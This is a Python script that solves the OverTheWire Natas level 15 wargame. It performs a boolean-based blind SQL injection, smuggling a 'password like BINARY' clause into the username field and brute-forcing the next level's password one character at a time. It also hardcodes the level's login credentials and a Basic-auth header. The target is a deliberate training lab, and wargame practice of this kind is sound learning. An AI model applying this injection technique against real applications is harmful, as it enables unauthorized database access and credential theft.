import os
import urllib.request as url
import urllib.parse
import string

NATAS_URL = 'http://natas15.natas.labs.overthewire.org'
NATAS_USERNAME = 'natas15'
NATAS_PWD = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
FOUND_STRING = 'This user exists.'
NOT_FOUND_STRING = "This user doesn't exist."
PASSWORD_LENGTH = 33


def isCorrectInput(string):
    '''
    Determines if the string returns "This user exists" or not

        Parameters:
            string : The input to the form
            
        Returns:
            True if the output is "This user exists". False otherwise
    '''
    request = urllib.parse.urlencode({'username': f'natas16" and password like BINARY "{string}'})
    request = request.encode('ascii')

    post_request = url.Request(NATAS_URL, request)
    output = url.urlopen(post_request)

    html_page = output.read().decode()

    containsString = html_page.find(FOUND_STRING) != -1
    return containsString


def next_char(previous_chars = '', password_letters = string.ascii_letters + string.digits):
    '''
    Determines the value of the next character. 

        Parameters:
            previous_char : The known first characters of the strings
            password_letters : The list of valid characters to loop into
        
        Returns:
            The known first characters with the new one appended
    '''
    for char in password_letters:
        test_string = previous_chars + char
        if isCorrectInput(test_string + '%'):
            return test_string


if __name__ == "__main__":

    ## =======================================================================================
    ## FETCH PAGE
    ## ----------
    ## This part works. I am able to reach the form page.
    ## =======================================================================================

    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password('Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    ## This commented out tactic also works. The website accepts the Authorization header
    ## after having connected at least once 

    # request = url.Request(NATAS_URL)
    # request.add_header('Authorization', 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==')
    # output = url.urlopen(request)

    output = url.urlopen(NATAS_URL)

    # This part is not necessary. It was only to prove myself that the urllib package works
    with open('output.html', 'w') as file:
        file.write(output.read().decode())

    ## =======================================================================================
    ## This part creates a list of letters that are in the password. I commented it out 
    ## because it takes some time to run so I want to avoid running it too often
    ## =======================================================================================

    alphanum = string.ascii_letters + string.digits

    password_letters = list()

    for alnum in alphanum:
        if isCorrectInput('%' + alnum + '%'):
            password_letters.append(alnum)

    print(password_letters)

    ## =======================================================================================
    ## BRUTEFORCE
    ## ----------
    ## This is where the fun begins. I am going to bruteforce the password using the password_letters
    ## list that I have generated
    ## =======================================================================================

    # password_letters = ['a', 'c', 'e', 'h', 'i', 'j', 'm', 'n', 'p', 'q', 't', 'w', 'B', 'E', 'H', 'I', 'N', 'O', 'R', 'W', '0', '3', '5', '6', '9']
    password = ''
    for i in range(PASSWORD_LENGTH - 1):
        password = next_char(password, password_letters)
        print(password)
    print('Bruteforce end')
